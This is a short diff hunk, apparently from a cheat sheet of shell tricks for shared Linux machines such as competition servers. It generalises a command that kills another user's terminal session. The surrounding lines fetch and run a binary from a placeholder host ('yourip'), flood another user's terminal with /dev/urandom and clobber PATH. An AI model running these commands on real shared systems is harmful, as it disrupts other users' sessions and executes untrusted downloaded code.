@@ -266,7 +266,9 @@ wget http://yourip/nyancat
 chmod +x nyancat 
 ./nyancat > /dev/$pts
 
-pkill -9 -t pts/1
+tty (If you're looking for your pts id/number)
+pkill -9 -t pts/<number>
+
 cat /dev/urandom > /dev/pts/# ( sending spam for another user )
 
 PATH=0
